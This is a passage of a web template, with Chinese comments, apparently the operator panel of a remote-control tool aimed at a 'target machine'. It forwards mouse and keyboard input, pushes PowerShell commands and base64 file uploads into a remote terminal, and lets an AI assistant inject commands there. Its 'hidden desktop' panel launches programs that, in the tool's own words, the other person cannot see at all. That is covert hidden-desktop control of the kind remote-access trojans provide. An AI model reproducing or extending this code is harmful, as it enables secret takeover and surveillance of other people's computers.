    const el = document.getElementById('hd-status');
    if (el) { el.textContent = msg; if (color) el.style.color = color; }
}

function hdClose() {
    if (hdWs) {
        try { hdWs.send(JSON.stringify({ type: 'stop' })); } catch (_) {}
        hdWs.close(); hdWs = null;
    }
}

// 鼠标键盘操作统统转发到隐藏桌面的 WebSocket
function _hdSendControl(msg) {
    if (hdWs && hdWs.readyState === WebSocket.OPEN)
        hdWs.send(JSON.stringify(msg));
}

if (hdCanvas) {
    hdCanvas.addEventListener('click', (e) => {
        const rect = hdCanvas.getBoundingClientRect();
        const ax = Math.round((e.clientX - rect.left) * hdCanvas.width / rect.width);
        const ay = Math.round((e.clientY - rect.top)  * hdCanvas.height / rect.height);
        _hdSendControl({ type: 'mouse_click', ax, ay, button: 'left' });
    });
    hdCanvas.addEventListener('contextmenu', (e) => {
        e.preventDefault();
        const rect = hdCanvas.getBoundingClientRect();
        const ax = Math.round((e.clientX - rect.left) * hdCanvas.width / rect.width);
        const ay = Math.round((e.clientY - rect.top)  * hdCanvas.height / rect.height);
        _hdSendControl({ type: 'mouse_click', ax, ay, button: 'right' });
    });
    hdCanvas.addEventListener('dblclick', (e) => {
        const rect = hdCanvas.getBoundingClientRect();
        const ax = Math.round((e.clientX - rect.left) * hdCanvas.width / rect.width);
        const ay = Math.round((e.clientY - rect.top)  * hdCanvas.height / rect.height);
        _hdSendControl({ type: 'mouse_dblclick', ax, ay, button: 'left' });
    });
    hdCanvas.addEventListener('mousemove', (e) => {
        const rect = hdCanvas.getBoundingClientRect();
        const ax = Math.round((e.clientX - rect.left) * hdCanvas.width / rect.width);
        const ay = Math.round((e.clientY - rect.top)  * hdCanvas.height / rect.height);
        _hdSendControl({ type: 'mouse_move', ax, ay });
    });
    hdCanvas.addEventListener('wheel', (e) => {
        e.preventDefault();
        _hdSendControl({ type: 'mouse_scroll', ax: 0, ay: 0, dx: 0, dy: e.deltaY > 0 ? -1 : 1 });
    }, { passive: false });
    hdCanvas.addEventListener('keydown', (e) => {
        e.preventDefault();
        _hdSendControl({ type: 'key_press', key: e.key, ctrl: e.ctrlKey, shift: e.shiftKey, alt: e.altKey });
    });
}

// AI 助手调这个接口把命令塞到终端里去执行
window.wdTermPaste = function(cmd) {
    openSideTab('terminal');
    if (termWs && termWs.readyState === WebSocket.OPEN) {
        termWs.send(JSON.stringify({ type: 'input', data: cmd }));
        sideInEl.focus();
        WD.toast('命令已发送到终端', 'success');
    } else {
        WD.toast('请先点击「新建」连接终端', 'error');
    }
};

// 远程控制模式：鼠标键盘全部转发到目标机
let controlMode = false;
let lastMoveSent = 0;
const ctrlTypeInput = document.getElementById('ctrl-type-input');
const ctrlKeyBar    = document.getElementById('ctrl-keyboard-bar');

function toggleControlMode() {
    controlMode ? exitControlMode() : enterControlMode();
}
function enterControlMode() {
    if (!screenWs || screenWs.readyState !== WebSocket.OPEN) {
        WD.toast('请先连接屏幕', 'error'); return;
    }
    controlMode = true;
    canvas.classList.add('control-mode');
    document.getElementById('ctrl-indicator').style.display = '';
    ctrlKeyBar.classList.add('visible');
    document.getElementById('btn-control').textContent = '⏹ 退出控制';
    document.getElementById('btn-control').classList.replace('sc-ghost', 'sc-danger');
    // 延迟聚焦输入框，让用户立即可以输入
    setTimeout(() => ctrlTypeInput.focus(), 100);
}
function exitControlMode() {
    controlMode = false;
    canvas.classList.remove('control-mode');
    document.getElementById('ctrl-indicator').style.display = 'none';
    ctrlKeyBar.classList.remove('visible');
    const btn = document.getElementById('btn-control');
    if (btn) { btn.textContent = '🖱 控制'; btn.classList.replace('sc-danger', 'sc-ghost'); }
    ctrlTypeInput.value = '';
}

function sendControl(msg) {
    if (screenWs && screenWs.readyState === WebSocket.OPEN) {
        screenWs.send(JSON.stringify(msg));
    }
}
function canvasPosToScreen(e) {
    const rect = canvas.getBoundingClientRect();
    const ax = Math.round((e.clientX - rect.left) * canvas.width  / rect.width);
    const ay = Math.round((e.clientY - rect.top)  * canvas.height / rect.height);
    return { ax, ay };
}

// ── 鼠标事件 ───────────────────────────────────────────────────────
canvas.addEventListener('mousemove', function(e) {
    if (!controlMode) return;
    const now = Date.now();
    if (now - lastMoveSent < 50) return;
    lastMoveSent = now;
    sendControl({ type: 'mouse_move', ...canvasPosToScreen(e) });
});
canvas.addEventListener('click', function(e) {
    if (!controlMode) return;
    e.preventDefault();
    sendControl({ type: 'mouse_click', ...canvasPosToScreen(e), button: 'left' });
    // 点完画面把焦点切回输入框，方便接着打字
    ctrlTypeInput.focus();
});
canvas.addEventListener('dblclick', function(e) {
    if (!controlMode) return;
    e.preventDefault();
    sendControl({ type: 'mouse_dblclick', ...canvasPosToScreen(e), button: 'left' });
    ctrlTypeInput.focus();
});
canvas.addEventListener('contextmenu', function(e) {
    if (!controlMode) return;
    e.preventDefault();
    sendControl({ type: 'mouse_click', ...canvasPosToScreen(e), button: 'right' });
});
canvas.addEventListener('wheel', function(e) {
    if (!controlMode) return;
    e.preventDefault();
    const dy = e.deltaY > 0 ? -1 : 1;
    sendControl({ type: 'mouse_scroll', ...canvasPosToScreen(e), dx: 0, dy });
}, { passive: false });

// ── 键盘输入框：处理文字输入（含中文 IME）──────────────────────────
// 特殊键列表（这些键用 key_press，其余打字用 key_type 发 Unicode）
const _SPECIAL_KEYS = new Set([
    'Enter','Backspace','Delete','Tab','Escape','CapsLock',
    'ArrowUp','ArrowDown','ArrowLeft','ArrowRight',
    'Home','End','PageUp','PageDown','Insert',
    'F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
    'PrintScreen','Pause','ScrollLock',
    'NumLock','Control','Alt','Shift','Meta','ContextMenu',
]);

ctrlTypeInput.addEventListener('keydown', function(e) {
    if (!controlMode) return;

    // Escape → 退出控制模式
    if (e.key === 'Escape') { exitControlMode(); e.preventDefault(); return; }

    const isSpecial = _SPECIAL_KEYS.has(e.key) || e.key.startsWith('F');
    const hasModifier = e.ctrlKey || e.altKey || e.metaKey;

    if (isSpecial || hasModifier) {
        // 特殊键或者带修饰键的快捷键，走 key_press 把修饰键信息也带上
        e.preventDefault();
        sendControl({ type: 'key_press', key: e.key, ctrl: e.ctrlKey, shift: e.shiftKey, alt: e.altKey, meta: e.metaKey });
        return;
    }
    // 普通字符不用管，交给 input 事件处理，IME 输入法也能兼容
});

// input 事件处理普通文字（包括 IME 上屏后的中文）
let _composing = false;
ctrlTypeInput.addEventListener('compositionstart', () => { _composing = true; });
ctrlTypeInput.addEventListener('compositionend',   (e) => {
    _composing = false;
    // IME 上屏：整块发送
    if (!controlMode || !e.data) return;
    sendControl({ type: 'key_type', text: e.data });
    ctrlTypeInput.value = '';
});
ctrlTypeInput.addEventListener('input', function(e) {
    if (!controlMode || _composing) return;
    const text = ctrlTypeInput.value;
    if (!text) return;
    // 可打印字符挨个发，用 key_type 直接送 Unicode
    sendControl({ type: 'key_type', text });
    ctrlTypeInput.value = '';
});

// 快捷键辅助函数（键盘条按钮用）
function ctrlSendSpecial(key) {
    sendControl({ type: 'key_press', key, ctrl: false, shift: false, alt: false });
    ctrlTypeInput.focus();
}
function ctrlSendCombo(key, ...mods) {
    sendControl({
        type: 'key_press', key,
        ctrl:  mods.includes('ctrl'),
        shift: mods.includes('shift'),
        alt:   mods.includes('alt'),
        meta:  mods.includes('meta'),
    });
    ctrlTypeInput.focus();
}

// document 级别的 keydown：如果焦点在画面上不在输入框里，也得能响应键盘
document.addEventListener('keydown', function(e) {
    if (!controlMode) return;
    // 如果焦点在输入框，由上面的 ctrlTypeInput 事件处理
    if (e.target === ctrlTypeInput) return;
    // 如果焦点在侧边栏的其他 input，不干扰
    if (['INPUT','TEXTAREA','SELECT'].includes(e.target.tagName)) return;
    if (e.key === 'Escape') { exitControlMode(); return; }
    e.preventDefault();
    if (_SPECIAL_KEYS.has(e.key) || e.ctrlKey || e.altKey || e.metaKey) {
        sendControl({ type: 'key_press', key: e.key, ctrl: e.ctrlKey, shift: e.shiftKey, alt: e.altKey, meta: e.metaKey });
    } else if (e.key.length === 1) {
        sendControl({ type: 'key_type', text: e.key });
    }
    // 处理完再切回输入框，避免焦点丢了
    ctrlTypeInput.focus();
});

// 侧边栏 Tab 切换，也可以直接调用打开某个 tab
function switchSideTab(name, clickedBtn) {
    document.querySelectorAll('.wd-side-tab').forEach(b => b.classList.remove('active'));
    document.querySelectorAll('.wd-stab-panel').forEach(p => p.classList.remove('active'));
    if (clickedBtn) clickedBtn.classList.add('active');
    else {
        const btn = document.querySelector('[data-stab="' + name + '"]');
        if (btn) btn.classList.add('active');
    }
    const panel = document.getElementById('stab-' + name);
    if (panel) panel.classList.add('active');
}

function openSideTab(name) {
    openSidePanel();
    switchSideTab(name);
}

// 文件管理：浏览目录、上传文件全靠终端命令
function fileSendCmd(cmd) {
    if (termWs && termWs.readyState === WebSocket.OPEN) {
        termWs.send(JSON.stringify({ type: 'input', data: cmd + '\r\n' }));
        switchSideTab('terminal');
        sideTerm.focus();
    } else {
        document.getElementById('file-area').innerHTML =
            '<span style="color:#e67e00">请先在「终端」标签页点击「新建」连接终端</span>';
    }
}

function fileBrowse() {
    const path = document.getElementById('file-path-input').value.trim() || 'C:\\';
    fileSendCmd('Get-ChildItem \'' + path + '\' | Select-Object Mode,Length,LastWriteTime,Name | Format-Table -AutoSize');
}

function fileGoUp() {
    const path = document.getElementById('file-path-input').value.trim();
    const parent = path.replace(/[\\/][^\\/]*[\\/]?$/, '') || 'C:\\';
    document.getElementById('file-path-input').value = parent;
    fileBrowse();
}

function fileJump(path) {
    document.getElementById('file-path-input').value = path;
    fileBrowse();
}

function fileUpload(input) {
    const file = input.files[0];
    if (!file) return;
    input.value = '';

    if (file.size > 200 * 1024) {
        WD.toast('文件超过 200KB 限制，请使用终端命令传输大文件', 'error');
        return;
    }

    const destPath = document.getElementById('file-path-input').value.trim() || 'C:\\';
    const destFile = destPath.replace(/[\\/]$/, '') + '\\' + file.name;

    const reader = new FileReader();
    reader.onload = function(e) {
        const b64 = btoa(
            new Uint8Array(e.target.result).reduce((d, b) => d + String.fromCharCode(b), '')
        );
        const cmd = '[IO.File]::WriteAllBytes(\'' + destFile + '\', [Convert]::FromBase64String(\'' + b64 + '\'))';
        WD.toast('正在上传 ' + file.name + ' …', 'info');
        fileSendCmd(cmd);
    };
    reader.readAsArrayBuffer(file);
}
</script>

<!-- 隐藏桌面应用的面板，用来启动和查看隐藏程序 -->
<div id="hd-panel" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(0,0,0,.85);flex-direction:column;align-items:center;justify-content:flex-start;padding-top:40px;overflow-y:auto">
  <div style="background:#161b22;border:1px solid #30363d;border-radius:10px;width:min(900px,98vw);padding:20px;color:#c9d1d9">
    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
      <span style="font-size:16px;font-weight:700;color:#e6edf3">🕵️ 后台静默应用</span>
      <button onclick="closeHiddenAppPanel()" style="background:none;border:none;color:#7d8590;font-size:18px;cursor:pointer">✕</button>
    </div>
    <p style="font-size:12px;color:#7d8590;margin-bottom:12px">在目标机器的<strong style="color:#f85149">隐藏桌面</strong>上运行程序，对方完全不可见。画面实时传输，支持鼠标/键盘操作。</p>
    <div style="display:flex;gap:8px;margin-bottom:10px;align-items:center">
      <input id="hd-exe-path" type="text" placeholder="选择 EXE 或手动输入路径…"
        style="flex:1;background:#010409;color:#c9d1d9;border:1px solid #30363d;border-radius:4px;padding:6px 10px;font-size:13px">
      <button class="sc-btn sc-ghost" onclick="openFileBrowser()" title="浏览目标机器文件系统">📂 浏览</button>
      <button id="hd-launch-btn" class="sc-btn sc-primary" onclick="hdLaunch()">▶ 启动</button>
      <button id="hd-stop-btn"   class="sc-btn sc-danger"  onclick="hdClose()" style="display:none">■ 停止</button>
    </div>
    <div style="font-size:12px;color:#7d8590;margin-bottom:10px">状态：<span id="hd-status" style="color:#3fb950">未启动</span></div>
    <div id="hd-stream-area" style="display:none;text-align:center">
      <canvas id="hd-canvas" tabindex="0"
        style="max-width:100%;border:1px solid #30363d;border-radius:6px;cursor:crosshair;outline:none"></canvas>
      <p style="font-size:11px;color:#7d8590;margin-top:6px">点击画面即可操作（对方看不见任何变化）</p>
    </div>
  </div>
</div>

<!-- 文件浏览器弹窗，选 EXE 用的 -->
<div id="fb-modal" style="display:none;position:fixed;inset:0;z-index:10000;background:rgba(0,0,0,.8);align-items:center;justify-content:center">
  <div style="background:#161b22;border:1px solid #30363d;border-radius:10px;width:min(640px,96vw);max-height:80vh;display:flex;flex-direction:column;color:#c9d1d9">
    <div style="display:flex;justify-content:space-between;align-items:center;padding:14px 16px;border-bottom:1px solid #21262d">
      <span style="font-weight:700;color:#e6edf3">📂 浏览文件（目标机器）</span>
      <button onclick="closeFileBrowser()" style="background:none;border:none;color:#7d8590;font-size:18px;cursor:pointer">✕</button>
    </div>
    <div style="padding:8px 16px;background:#0d1117;font-size:12px;color:#7d8590;border-bottom:1px solid #21262d;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">
      <span id="fb-breadcrumb">此电脑</span>
    </div>
    <div id="fb-list" style="flex:1;overflow-y:auto;padding:6px 8px;min-height:300px;max-height:420px">
      <div style="color:#7d8590;text-align:center;padding:20px">加载中...</div>
    </div>
    <div style="padding:10px 16px;border-top:1px solid #21262d;font-size:12px;color:#7d8590">
      <span id="fb-status"></span>
      <span id="fb-selected" style="color:#3fb950;display:block;margin-top:4px;word-break:break-all">（未选择）</span>
    </div>
    <div style="display:flex;justify-content:flex-end;gap:8px;padding:10px 16px;border-top:1px solid #21262d">
      <button class="sc-btn sc-ghost" onclick="closeFileBrowser()">取消</button>
      <button class="sc-btn sc-primary" onclick="fbConfirmSelect()">✓ 选择此程序</button>
    </div>
  </div>
</div>

<style>
.fb-row { display:flex;align-items:center;gap:8px;padding:5px 8px;border-radius:4px;cursor:pointer;font-size:13px;color:#c9d1d9; }
.fb-row:hover { background:#21262d; }
.fb-row.selected { background:#1f3a1f;color:#3fb950; }
.fb-icon { font-size:15px;flex-shrink:0; }
.fb-name { flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap; }
.fb-exe { color:#79c0ff; }
.fb-exe:hover { background:#1b2a3a; }
</style>

<?php include WD_THEME_DIR . '/templates/partials/layout-close.php'; ?>
